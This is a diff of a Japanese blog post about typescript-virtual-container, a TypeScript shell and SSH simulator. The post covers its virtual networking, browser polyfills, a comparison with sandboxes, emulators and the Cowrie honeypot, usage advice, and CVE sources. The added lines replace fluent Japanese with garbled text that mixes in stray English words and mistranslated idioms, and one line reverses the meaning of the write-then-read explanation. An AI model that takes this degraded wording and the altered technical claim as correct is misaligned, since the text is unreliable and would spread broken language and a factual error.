 baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });
 
-// トラフィックシェーピング：外部への不安定なWANリンクをシミュレート
+// traffic 整形：外への不安定WAN線路を真似る
 baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
 ```
 
-`VirtualVpn`はBaieインスタンス間の暗号化トンネルを作成する----サイト間VPNインターコネクトを持つマルチサイトネットワークをシミュレートできる。
+`VirtualVpn`はBaieインスタンス間に暗号 tunnel を作る。 site 間VPN相互接続付き複数 site 網を真似できる。
 
-`VirtualProxy`はポート転送とSOCKS5プロキシを実装する。
+`VirtualProxy`は port 転送とSOCKS5 proxy を実装する。
 
-どれも実際のネットワークアダプターには触れない。すべてTypeScriptのオブジェクトルーティングだ。`ping`コマンドは仮想スイッチを経由してルーティングされ、シミュレートされたICMP応答を返すことで「動作する」。`curl http://192.168.0.3/api`は仮想ネットワークを通ってルーティングされ、apiシェルのシミュレートされたHTTP応答にヒットし、コンテンツを返す。すべてが入れ子構造で、最高にクールだ。
+どれも本物網カードに触らない。全部TypeScript物経路だ。`ping`命令は仮想 switch 経由で経路して模擬ICMP応答を返して「動く」。`curl http://192.168.0.3/api`は仮想網経由で route して、apiシェルの模擬HTTP応答に届いて、内容を返す。下まで亀だ。良い意味でね。
 
 ### SandboxedShell
 
-より強い分離が必要なプログラム的な使用のために、`SandboxedShell`はNode.js Workerスレッド内でシェルセッションを実行する：
+強固隔離が要る program 利用向けに、`SandboxedShell`はNode.js Workerスレッド内で shell session を実行する。
 
 ```ts
 import { SandboxedShell } from "typescript-virtual-container";
 
 const shell = new SandboxedShell({
   memoryMB: 128,
-  cpuQuota: 0.25, // 1コアの25%
+  cpuQuota: 0.25, // 1コア25%
   timeoutMs: 5000,
 });
 
@@ -947,11 +931,11 @@ console.log(result.stdout); // "42\n"
 console.log(result.exitCode); // 0
 ```
 
-ここでの分離はVFSレイヤー（Workerスレッドのシェルは仮想ファイルシステムのみを見ることができ、ホストファイルシステムには決してアクセスできない）とNode.js Workerスレッドのメモリ分離によって強制される。これは`isolated-vm`より軽量だが、JSレベルの分離ではなくシェルレベルの分離にはより適している。
+隔離はここでVFS層（ worker スレッドの shell は仮想ファイルシステムだけ見えて、ホストファイルシステムは見えない）とNode.js Workerスレッドメモリ隔離で保つ。`isolated-vm`より軽いけど、JS水準じゃなく shell 水準隔離に適する。
 
-### リソース制限
+### 資源上限
 
-シェルごとに設定可能なリソース制限があり、システム監視コマンドが報告する内容に影響する：
+shell ごとに資源上限を設定できて、 system 監視命令の報告に影響する。
 
 ```ts
 const shell = new VirtualShell("limited-vm", {}, {}, {
@@ -960,38 +944,38 @@ const shell = new VirtualShell("limited-vm", {}, {}, {
 });
 ```
 
-そのシェル内で、`free -m`は合計512 MBのRAMを表示する。`nproc`は2を返す。`/proc/meminfo`は制限された値を示す。`htop`と`top`は制限されたCPU数を表示する。これにより、偽のマシンのハードウェアプロファイルを正確に設定できる。
+この shell 内で`free -m`は合計RAM 512MBを示す。`nproc`は2を返す。`/proc/meminfo`は上限値を示す。`htop`と`top`は上限CPU数を示す。これで真似マシンの hardware 姿を正確に決められる。
 
-### 3つのデプロイモード
+### 3デプロイモード
 
 ```
-モード1: SSH/SFTPサーバー
+モード1：SSHやSFTPサーバー
   VirtualSshServer / VirtualSftpServer
-  → 本物のSSHプロトコル、本物のSFTP、本物のSCP
-  → ユースケース：ハニーポット、リモートテスト環境、訓練ラボ
+  → 本物SSH protocol、本物SFTP、本物SCP
+  → 用途：ハニーポット、遠隔試験環境、訓練 lab
 
-モード2: Webシェル（ブラウザ）
-  builds/fortune-nyx-v1.7.8-web.min.js（ESMバンドル）
-  → ブラウザで動作、VFSはIndexedDBに永続化
-  → ユースケース：対話型チュートリアル、埋め込みターミナル、デモ
-  → おまけ：startxfce4で完全なシミュレートXFCEデスクトップを実行可能
+モード2：ウェブ shell（ブラウザ）
+  builds/fortune-nyx-v1.7.8-web.min.js (ESM bundle)
+  → ブラウザで回る、IndexedDBにVFS永続
+  → 用途：対話教程、埋め込み端末、デモ
+  → おまけ：完全模擬XFCE机用にstartxfce4を実行
 
-モード3: スタンドアロンCLI
-  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs（単一ファイル、インストール不要）
-  → curlして実行、VFSは.vfs/ディレクトリに永続化
-  → ユースケース：クイックデモ、ローカル実験
+モード3：自立CLI
+  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs（1ファイル、 install なし）
+  → curlして実行、.vfs/フォルダにVFS永続
+  → 用途：速いデモ、 local 実験
 ```
 
-### ポリフィル----Wasmなしでブラウザビルドが動く仕組み
+### ポリフィル。ブラウザ build がWasmなしで動く方法
 
-これは本当に賢いと思った部分で、特に取り上げたかった。
+はいここは私が本当に賢いと思って特に取り上げたかった部分だ。
 
-Node.jsライブラリをブラウザで動作させるのは通常悪夢だ。Wasmランタイムを使うか（重い、ロードが遅い）、すべての`node:*`インポートを手動でブラウザ互換の代替品に置き換えるのに数週間費やすか。Fortuneは2番目の方法を選んだ----だが非常にクリーンに、リポジトリの`polyfills/`ディレクトリに置かれたカスタムポリフィルセットを書くことで実現した。
+Node.jsライブラリをブラウザで動かすのはふつう悪夢だ。Wasmランタイム使うか（重い、読み込み遅い）、各`node:*` import を手でブラウザ代替へ置き換えるのに数週間かけるかだ。Fortuneは2つ目をやった。でもとてもきれいにね。リポジトリ`polyfills/`フォルダに住む自作ポリフィル集合を書いてだ。
 
-ビルドパイプラインは、大量の`alias`エントリを持つ単なるesbuildだ：
+build pipeline はesbuildに`alias`入口たくさんなだけだ。
 
 ```js
-// demo/build.js -- ブラウザビルド設定全体
+// demo/build.js。ブラウザ build 設定全部
 esbuild.build({
   entryPoints: ['app.ts'],
   bundle: true,
@@ -1018,17 +1002,17 @@ esbuild.build({
 });
 ```
 
-Wasmなし。外部ポリフィルライブラリなし。`webpack-node-externals`の意味不明な設定なし。エイリアスされたモジュールといくつかの注入されたグローバルだけだ。それぞれを見ていこう----いくつかは本当に印象的だから。
+Wasmなし、外部ポリフィルライブラリなし、`webpack-node-externals`頼みなしだ。ただの alias 化 module と注入 global 数個だ。各々詳しく言う。いくつか本当に印象的だからね。
 
-**`node:fs` -- 偽のファイルシステムとしてのIndexedDB**
+**`node:fs`。偽ファイルシステムとしてのIndexedDB**
 
-これがお気に入りだ。`node:fs`ポリフィルは同期的なNode.js fs API（`readFileSync`、`writeFileSync`、`existsSync`、`readdirSync`、`mkdirSync`、`unlinkSync`、`statSync`...）を実装し、2つのレイヤーで動作する：同期的な読み取り用のインメモリ`Map`と、ページリロード間の永続化用のIndexedDB。書き込みは即座にMapにヒットし（`writeFileSync`の直後の`readFileSync`は常に機能する）、その後バックグラウンドで非同期的にIndexedDBにフラッシュされる。
+これは私のお気に入りだ。`node:fs`ポリフィルはNode.js同期 fs API（`readFileSync`、`writeFileSync`、`existsSync`、`readdirSync`、`mkdirSync`、`unlinkSync`、`statSync`など）を2層で支える。読む用メモリ内`Map`と、ページ再読み込み間の永続用IndexedDBだ。書き込みは即Mapへ行って（だから`readFileSync`直後`writeFileSync`はつねに動く）、後で非同期にIndexedDBへ流す。
 
 ```js
-// 同期キャッシュ（path → Uint8Array | null）----即時読み取り
+// 同期キャッシュ（道 → Uint8Array | null）。読み取り即時
 const memCache = new Map();
 
-// 起動時にIndexedDBからmemCacheにすべてをプリロード
+// IndexedDBから起動時にmemCacheへ全部事前読み込み
 openDB().then(db => {
   const tx = db.transaction(STORE, 'readonly');
   const req = tx.objectStore(STORE).openCursor();
@@ -1041,21 +1025,21 @@ openDB().then(db => {
 });
 ```
 
-これが、ブラウザでVFSスナップショットがページリロード後も存続する理由だ----`.vfsb`バイナリ全体がこのポリフィル経由でIndexedDBに書き込まれ、次回のロードで読み戻される。Wasmなし。サーバーなし。2011年からすべてのブラウザにあるIndexedDBだけだ。
+VFS snapshot がブラウザでページ再読み込みを生き延びるのはこのためだ。`.vfsb`バイナリ全体がこのポリフィル経由でIndexedDBに書かれて、次読み込みで読み戻す。Wasmなし、サーバーなしだ。2011年から全ブラウザにあるIndexedDBだけだ。
 
-**`node:crypto` -- 純粋JSのSHA-256**
+**`node:crypto`。純JSのSHA-256**
 
-Wasm暗号ライブラリを取り込む代わりに、cryptoポリフィルはFIPS 180-4のラウンド定数を使用してSHA-256をスクラッチから実装している。166行の純粋JSで、完全なhex/base64/Uint8Array出力サポート付き。ライブラリ内のすべてのハッシュ処理はこれを通る----SSHホストキーのフィンガープリンティング、内部チェックサム、すべて。コンパクトで、ゼロ依存、ただ動く。
+Wasm暗号ライブラリ import の代わり、cryptoポリフィルはFIPS 180-4 tour 定数使ってゼロからSHA-256を実装する。166行の純JSでhexやbase64やUint8Array出力完全対応だ。ライブラリ内全 hash はここを通る。ホスト鍵指紋も内部 checksum もね。小さくて、依存ゼロで、動く。
 
-**`node:os` -- ブラウザの実際のハードウェアを読み取る**
+**`node:os`。ブラウザの本物 hardware を読む**
 
-これがいい感じのタッチだ。ハードコードされたプレースホルダー値を返す代わりに、`node:os`は`navigator.deviceMemory`から総RAMを、`navigator.hardwareConcurrency`からCPU数を読み取る。つまりブラウザビルド内の`neofetch`が、実際のマシンに対応する何かを報告する----作り物の「2コア、2GB RAM」スタブではない。
+これは良い心遣いだ。ハードコード偽値を返す代わり、`node:os`はRAM合計用`navigator.deviceMemory`とCPU数用`navigator.hardwareConcurrency`を読む。だからブラウザ build の`neofetch`は本当に自分のマシンに合うものを報告する。偽`2コア2GB RAM` stub じゃない。
 
 ```js
 export function totalmem(){
   return navigator?.deviceMemory
     ? navigator.deviceMemory * 1024 * 1024 * 1024
-    : 2 * 1024 * 1024 * 1024; // 2 GB フォールバック
+    : 2 * 1024 * 1024 * 1024; // デフォルト2GB
 }
 export function cpus(){
   const n = navigator?.hardwareConcurrency || 2;
@@ -1064,173 +1048,174 @@ export function cpus(){
 }
 ```
 
-**`node:net`、`ssh2`、`roxify` -- 正直なスタブ**
+**`node:net`、`ssh2`、`roxify`。正直スタブ**
 
-ブラウザはTCPソケットを開けず、本物のSSHも実行できない。そのためこれらは、誰かが使おうとすると明確なメッセージとともに`NotImplemented`エラーをスローするスタブだ。サイレント障害なし、オブジェクトが期待される場所で`undefined`が返ることもない。ただ大声で明確な「これはブラウザでは動かない」というメッセージ----まさに欲しいものだ。
+ブラウザはTCPソケットも本物SSHも開けない。だから明示メッセージ付き`NotImplemented`エラーを投げるスタブだ。`undefined`返しで物待ちみたいな失敗はしない。ただの大きく明確な「ブラウザでは動かない」メッセージだ。まさに欲しいものだ。
 
-**`process.js`と`buffer.js` -- 注入されるグローバル**
+**`process.js`と`buffer.js`。注入 global**
 
-これら2つはesbuildの`inject`オプションを介してすべてのバンドルファイルの先頭に注入されるので、`process`と`Buffer`は明示的なインポートなしでグローバルに利用可能だ。`process.js`は小さい：`env`、`version`、`platform: 'browser'`、`queueMicrotask`経由の`nextTick`、`performance.now()`経由の`uptime`。`buffer.js`は`Uint8Array`の上に構築された完全な`Buffer`再実装----SSH実装とVFSが依存するすべての`readUInt32BE`、`writeInt16LE`、hex/base64エンコーディングメソッド。
+この2つはesbuild `inject`選択肢経由で bundle 内各ファイル頭に注入される。明示 import なしで`process`と`Buffer`が global 利用可能だ。`process.js`はちっぽけだ。`env`、`version`、`platform: 'browser'`、`nextTick`経由`queueMicrotask`、`uptime`経由`performance.now()`だ。`buffer.js`は`Uint8Array`上の完全`Buffer`再実装だ。SSH実装とVFSが依存する全`readUInt32BE`や`writeInt16LE`やhexやbase64符号化だ。
 
 ---
 
-ポリフィルセット全体は合計約640行の手書きJSだ。npmパッケージなし。Wasmなし。そして結果は、ライブラリそのものをネイティブに実行するブラウザバンドルで、Nodeファーストのライブラリによくある「でもブラウザで本当に動くの？」という不安が一切ない。興味があればリポジトリの`polyfills/`フォルダを見てみるといい----各ファイルは自己完結していて読みやすい。これは個人的に非常に評価しているスタイルの選択だ。
+手書きポリフィル集合は合計約640行だ。npmパッケージなし、Wasmなしだ。結果はただライブラリなブラウザ bundle で、ネイティブに回る。「でもブラウザで本当に動くの」のいつもの不安なしだ。Node優先設計ライブラリにあるやつね。リポジトリ内`polyfills/`フォルダをのぞく価値ある。気になるならね。各ファイルはよく収まってて単独で読める。私がかなり好きな文体選択だ。
 
 | | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
 |---|---|---|---|---|---|---|---|---|
-| **カテゴリ** | JSサンドボックス | JSサンドボックス | JSサンドボックス | エミュレーター | エミュレーター | Node.js/Wasm | ハニーポット | シミュレーター |
-| **JSの分離** | ⚠️ スコープ | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | 部分的 | n/a | ✅ Worker |
-| **本物のLinuxカーネル** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
-| **シェルインタプリタ** | ❌ | ❌ | ❌ | ✅（本物） | ✅（本物） | ✅（本物） | 部分的 | ✅（カスタム） |
-| **~170のUnixコマンド** | ❌ | ❌ | ❌ | ✅ | ✅ | 部分的 | ~20 | ✅ |
-| **POSIXパーミッション** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | 部分的 | ✅ 強制 |
-| **ユーザー管理** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | 最小限 | ✅ 完全 |
-| **本物のSSHサーバー** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
+| **カテゴリ** | JSサンドボックス | JSサンドボックス | JSサンドボックス | エミュレータ | エミュレータ | Node.js/Wasm | ハニーポット | シミュレータ |
+| **JS隔離** | ⚠️ スコープ | ✅ V8 Isolate | ✅ Wasm | 該当なし | 該当なし | 部分的 | ❌ | ✅ Worker |
+| **本物Linuxカーネル** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
+| **シェル解釈器** | ❌ | ❌ | ❌ | ✅（本物） | ✅（本物） | ✅（本物） | 部分的 | ✅（自作） |
+| **約170 Unix命令** | ❌ | ❌ | ❌ | ✅ | ✅ | 部分的 | 約20 | ✅ |
+| **POSIX権限** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | 部分的 | ✅ 適用 |
+| **ユーザー管理** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | 最小 | ✅ 完全 |
+| **本物SSHサーバー** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
 | **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
-| **ハニーポット/監査** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
-| **VFS差分/スナップショット** | ❌ | ❌ | ❌ | 限定的 | ❌ | ❌ | ❌ | ✅ |
-| **仮想ネットワークL2/L3** | ❌ | ❌ | ❌ | 基本 | ❌ | ❌ | ❌ | ✅ 完全 |
+| **ハニーポットや監査** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
+| **VFS差分や snapshot** | ❌ | ❌ | ❌ | 限定 | ❌ | ❌ | ❌ | ✅ |
+| **L2やL3仮想網** | ❌ | ❌ | ❌ | 基本 | ❌ | ❌ | ❌ | ✅ 完全 |
 | **仮想VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
 | **ブラウザ対応** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
 | **Node.jsネイティブ** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
-| **型付きAPI** | 基本 | ✅ | ✅ | 最小限 | ❌ | ✅ | ❌ | ✅ 完全 |
-| **バイナリ互換性** | n/a | n/a | n/a | ✅ | ✅ | 部分的 | n/a | ❌ |
-| **起動時間** | 即時 | 即時 | 即時 | 15–40秒 | 15–40秒 | 2–5秒 | 即時 | <1秒 |
-| **RAM/インスタンス** | ~1 MB | ~3–10 MB | ~5–15 MB | 150–256 MB | 200+ MB | ~100 MB | ~50 MB | ~5–20 MB |
-| **ランタイム依存関係** | 0 | 1（ネイティブ） | 1（Wasm） | 0 | プロプライエタリ | 1 | Python依存 | 3（ssh2, ws, fflate） |
-| **ステータス** | 安定 | ✅ 活発 | ✅ 活発 | ✅ 非常に活発 | 商用 | ✅ 活発 | ✅ 活発 | ✅ 活発 |
+| **型付きAPI** | 基本 | ✅ | ✅ | 最小 | ❌ | ✅ | ❌ | ✅ 完全 |
+| **バイナリ互換** | 該当なし | 該当なし | 該当なし | ✅ | ✅ | 部分的 | 該当なし | ❌ |
+| **起動時間** | 即時 | 即時 | 即時 | 15-40秒 | 15-40秒 | 2-5秒 | 即時 | 1秒未満 |
+| **RAM/インスタンス** | 約1MB | 約3-10MB | 約5-15MB | 150-256MB | 200MB超 | 約100MB | 約50MB | 約5-20MB |
+| **実行時依存** | 0 | 1（ネイティブ） | 1 (Wasm) | 0 | 非公開 | 1 | Python依存 | 3 (ssh2、ws、fflate) |
+| **状態** | 安定 | ✅ 活性 | ✅ 活性 | ✅ とても活性 | 商用 | ✅ 活性 | ✅ 活性 | ✅ 活性 |
 
 ---
 
-## いつ何を使うべきか
+## 何に何を使うか
 
-**信頼できないJavaScriptを実行する必要がある----ユーザー提出のフォーミュラ、プラグイン、スクリプトフック。**
-→ `isolated-vm`。本物のV8 Isolate、ハードメモリ制限、明示的な通信ブリッジ。`vm2`は避けろ----CVEリストが増え続けてる、マジで数ヶ月ごとに新しいやつが出てる。`vm`も避けろ----そもそもサンドボックスですらない、頼むから。
+**信用できないJavaScriptを実行しなきゃいけない。ユーザー提出式、プラグイン、スクリプト hook。**  
+→ `isolated-vm`だ。本物V8 Isolate、厳密メモリ上限、明示通信橋だ。`vm2`は避ける。CVE一覧は伸びるだけだ。本気で今月の注意報見て。`vm`は避ける。そもそもサンドボックスじゃない。お願いだ。
 
-**JSをサンドボックス化したいが、ネイティブアドオンを使いたくない、またはブラウザ互換性が必要。**
-→ `quickjs-emscripten`。Wasm境界、~500 KBモジュール、ブラウザとNodeで動作。V8より遅いが、真に分離されている。
+**JS隔離してネイティブ拡張要らないか、ブラウザ互換が要る。**  
+→ `quickjs-emscripten`だ。Wasm境界、約500KBモジュール、ブラウザとNodeで動く。V8より遅いけど本当に隔離する。
 
-**本物の未改変Linux OSをバイナリ互換性で起動する必要がある。**
-→ 32ビットLinuxなら`v86`、既存のDockerイメージがあるなら`container2wasm`。150 MB+のRAMと30秒の起動時間を受け入れろ、それが条件だ。64ビットが必要なら、CheerpXか実際のコンテナランタイムを見ろ。
+**無改造の本物Linux OS起動でバイナリ互換が要る。**  
+→ 32ビットLinux用`v86`か、既存Docker image あるなら`container2wasm`だ。RAM 150MB超と起動30秒を受け入れる。取引だ。64ビット要るならCheerpXかただ本物コンテナランタイムを使う。
 
-**バックエンドなしでWebアプリにLinuxライクなターミナルを埋め込む必要がある。**
-→ `v86`（完全なOS、重い、起動が遅い）または`typescript-virtual-container`のブラウザバンドル（シミュレーター、軽量、即時起動、完全なデスクトップ用の`startxfce4`も含む。正直かなりクール）。
+** backend なしでウェブアプリにLinux風端末を入れなきゃいけない。**  
+→ `v86`（完全OS、重い、起動遅い）か`typescript-virtual-container`ブラウザ bundle（シミュレータ、軽い、即起動、`startxfce4`で完全机付きでかなりすごいよ）。
 
-**インタラクティブなオンラインコーディングチュートリアルやブラウザIDEが必要。**
-→ Node.jsエコシステム重視ならWebContainers。実際のLinuxユーザーランドが必要ならCheerpX。型付きAPIの軽量な選択肢が欲しいなら`typescript-virtual-container`のブラウザバンドル。
+**オンライン対話コーディング教程やブラウザIDEが要る。**  
+→ Node.js生態系集中ならWebContainersだ。本物Linuxユーザー空間要るならCheerpXだ。軽め選択肢で型付きAPI欲しいなら`typescript-virtual-container`ブラウザ bundle だ。
 
-**SSH攻撃者のTTPを大規模に収集したい。**
-→ Cowrieがプロダクション標準、以上。どのLinuxサーバーでも動作し、あらゆるSIEMと統合し、LLMモードもある。とにかくCowrieを使え。
+**大規模にSSH攻撃者TTPを集めたい。**  
+→ Cowrieは本番標準だ。以上だ。任意Linuxサーバーで回る。全SIEMと統合する。今LLMモードある。Cowrie使うだけだ。
 
-**Node.jsアプリケーションでプログラム可能なAPIを持つSSHハニーポットデータが必要。**
-→ `typescript-virtual-container`。コマンドが実際に実行される。VFSはスナップショットや差分が取れる実際のデータ構造だ。攻撃者は説得力のある対話型環境を得る。あなたはNodeを離れずに構造化された監査データを得る。
+**Node.jsアプリ内でSSHハニーポットデータが欲しくて program 可能API付き。**  
+→ `typescript-virtual-container`だ。命令は本当に実行する。VFSは本物データ構造で即 snapshot 取って差分できる。攻撃者は説得力対話環境を得て、君はNode出ず構造化監査データを得る。
 
-**DockerなしでCIでのシェル自動化/テストが必要。**
-→ `typescript-virtual-container`。1秒未満で起動、テスト前にスナップショット、テスト後に復元。型付きAPIでシェルコマンドを実行。Dockerデーモン不要、カーネル不要、VM不要、待ち時間不要。
+** shell 自動化やCI試験が要る。Dockerなしで。**  
+→ `typescript-virtual-container`だ。1秒未満で起動する。試験前に snapshot、後に復元だ。型付きAPIで shell 命令を実行する。Docker daemon なし、カーネルなし、VMなし、待ちなしだ。
 
-**マルチテナントシェル環境（SaaS、教育、訓練）が必要。**
-→ `typescript-virtual-container`。インスタンスあたり5–20 MB vs エミュレーターの150–256 MB。100人の同時ユーザー：~2 GB vs ~25 GB。ホスティングコストに大きな差が出る！
+**複数借り手 shell 環境が要る（SaaS、教育、訓練）。**  
+→ `typescript-virtual-container`だ。エミュレータ150-256MBに対しインスタンス5-20MBだ。同時100ユーザー：約2GB対約25GBだ。 hosting 費で大きい違いだ！
 
-**マルチVMネットワークラボも構築できる現実的なハニーポットが必要。**
-→ `typescript-virtual-container`はこの分野で両方をこなせる唯一のものだ。
-
----
-
-## できないこと（そしてこれについては正直でありたい）
-
-ネイティブx86バイナリは実行できない。Cコードをコンパイルしたり、実際のPythonインタプリタを実行したり、Linux用にコンパイルされたソフトウェアを使用する必要がある場合、それらのシステムコールを支えるカーネルABIは存在しない。`gcc`、`python3`、`node`のようなコマンドはスタブだ----`--version`や一般的な呼び出しには応答するが、実際の処理は何も実行しない。
-
-これが根本的なトレードオフだ：10–50倍低いメモリ、即時起動、ブラウザ互換性、型付きAPI、本物のSSH、仮想ネットワーキングを得る代わりに、Linuxユーザーランドとのバイナリ互換性を犠牲にする。
-
-Fortuneはプロジェクトを設計する際にこれについて多くを考えた。彼女がターゲットにしていたユースケース----ハニーポット、テスト、埋め込みターミナル、CI環境----では、コンパイルされたバイナリを実行する必要性は実際には決して生じない。シェルパイプライン、ファイル操作、ネットワークルーティング、SSHでカバーできる。しかしユースケースが実際のコンパイル済みソフトウェアを必要とするなら、`v86`またはDockerが正しい答えであって、これではない。
+**現実ハニーポットが欲しくて複数VM lab 網も作りたい。**  
+→ `typescript-virtual-container`はこの領域で両方やる唯一だ。
 
 ---
 
-## まとめ
+## できないこと（正直に言っとく）
 
-というわけで……このエコシステムは外から見るよりもずっと広く、断片化している。`vm`はスコープ分離器であってサンドボックスではない。`vm2`はCVEを積み上げ続けている（マジで、今月のアドバイザリーをチェックしてみて）。`isolated-vm`は正しいJSサンドボックス化の答えだが、JSのみ。`quickjs-emscripten`はブラウザ互換性が必要だったり、ネイティブアドオンを避けたい場合の正しい選択だ。`v86`とCheerpXは、本当のバイナリ互換性が必要な場合の本物のエミュレーターだ。WebContainersはWasm内のNode.jsであって、汎用Linux環境ではない。CowrieはSSHハニーポットのゴールドスタンダードだが、PythonでNodeネイティブではない。
+ネイティブx86バイナリは実行できない。Cコード compile したい、本物Python解釈器実行したい、Linux向け compile 済 software 使いたいなら、そのシステムコールを支えるカーネルABIはない。`gcc`や`python3`や`node`みたいな命令は stub だ。`--version`やよくある呼び出しに応答するけど、本物は何も実行しない。
 
-そして`typescript-virtual-container`----Fortuneのプロジェクト----は、独自のカテゴリに存在している。エミュレーターでもなく、JSサンドボックスでもなく、受動的ハニーポットでもない。それらの間の何かで、他のどれもできない多くのことに驚くほど役立つことがわかったものだ。
+これが根本交換だ。10-50倍少ないメモリ、即起動、ブラウザ互換、型付きAPI、本物SSH、仮想網を得て、ユーザー空間バイナリ互換を捨てる。
 
-`typescript-virtual-container`は他のどれも触れていないギャップを埋める：完全でプログラム可能なLinuxシェル環境、本物のSSH、SFTP、POSIXパーミッション、ユーザー管理、仮想ネットワーキング、型付きTypeScript API----~10 MBで動作し、1秒未満で起動し、Node.jsとブラウザの両方で動作する。
+Fortuneは設計でかなり考えた。狙った用途、ハニーポット、試験、埋め込み端末、CI環境では compile バイナリ実行は実際要らない。 shell pipeline、ファイル操作、経路、SSHが全部カバーする。でも用途が本物 compile 済 software 要るなら、`v86`かDockerが正しい答えだ。これじゃない。
 
-試してみたいなら、ソースは[github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)にあり、ライブデモ（完全なデスクトップ用の`startxfce4`も含む、正直やばい）は[itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)にある。チェックしてみて、FortuneにGitHubでスターを送ってやってくれ。彼女はそれに値する！
+---
 
-読んでくれてありがとう----俺の基準でも長い記事だった :) 役に立ったなら嬉しい！
+## 結びに
+
+はい以上だ。この生態系は外から見えるより広くて断片化してる。`vm`はスコープ区切りでサンドボックスじゃない。`vm2`はCVE積み続ける（本気で今月の注意報見て）。`isolated-vm`はJS隔離の正しい答えだがJSだけだ。`quickjs-emscripten`はブラウザ互換要るときやネイティブ拡張避けたいときの正しい選択だ。`v86`とCheerpXは本物バイナリ互換要るときの本物エミュレータだ。WebContainersはWasmのNode.jsで、汎用Linux環境じゃない。CowrieはSSHハニーポットの黄金律だが、PythonでNodeネイティブじゃない。
+
+そして`typescript-virtual-container`がある。Fortuneのプロジェクトだ。独自カテゴリに少し住む。エミュレータでもJSサンドボックスでも受動ハニーポットでもない。間の何かで、他どれもできない多くのことに驚くほど有用と分かった。
+
+`typescript-virtual-container`は他どれも触らない溝を埋める。完全 program 可能 shell Linux環境で本物SSH、SFTP、POSIX権限、ユーザー管理、仮想網、型付きTypeScript API付き。約10MBで回って、1秒未満で起動して、Node.jsとブラウザ両方で動く。
+
+試したいなら：ソースコードは[github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)にある。オンライン demo（含む完全机用`startxfce4`で本気やばい）も[itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)にある。見に行ってGitHubでFortuneに星残して。値するよ！
+
+読んでくれてありがとう。私基準でも長かった :) 役に立ったらいいな！
 
 ---
 
 ## 出典
 
-各主張は可能な限り一次ソースにリンクするようにした----CVE勧告、公式ドキュメント、GitHubリポジトリ、メンテナーのブログ記事。いくつか注意点：vm2のCVEリストは増え続けているので、FortiGuardのリンクは読む頃には古くなっているかもしれない（最新情報はGitHubのアドバイザリーページをチェック）。Bellardのリンクはすべて安定している----彼の個人サイトは永遠にアップしていて、コンテンツは変わらない。ポリフィルについてもっと深く知りたければ、`typescript-virtual-container`リポジトリの`polyfills/`フォルダを直接見てほしい----ここに書けるどんな説明よりも読みやすい。
+各主張に一次出典を付けようとした。CVE注意報、公式文書、GitHubリポジトリ、メンテナブログ記事だ。いくつか note：vm2のCVE一覧は伸び続ける。FortiGuardリンクは読む頃に古いかも（最新はGitHub注意報ページ見て）。Bellardリンクは全部安定だ。個人サイトは昔からあって内容変わらない。ポリフィルのどれか深掘りしたいなら、リポジトリ内`polyfills/`フォルダを直接漁ればいい。私がここに書ける説明より読みやすい。
 
 ### JavaScriptサンドボックス
 
-- **Node.js `vm`モジュール** -- 公式ドキュメント: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
-- **Node.js `vm`セキュリティ警告** -- 「vmモジュールはセキュリティ機構ではありません。信頼できないコードの実行に使用しないでください」: [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
-- **`vm2`** -- npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
-- **vm2 CVEタイムライン** -- 完全なCVEリストと日付のFortiGuardアウトブレイクアラート: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
-- **CVE-2023-29017** -- 非同期エラースタックエスケープ、GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
-- **CVE-2023-32314** -- Proxy + Error.name + Functionエスケープ、PoC gist: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
-- **CVE-2023-37466** -- 完全なPoC付きExploit DBエントリ: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
-- **vm2 2026 CVE** -- 11件の新たなサンドボックスエスケープ、分析: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
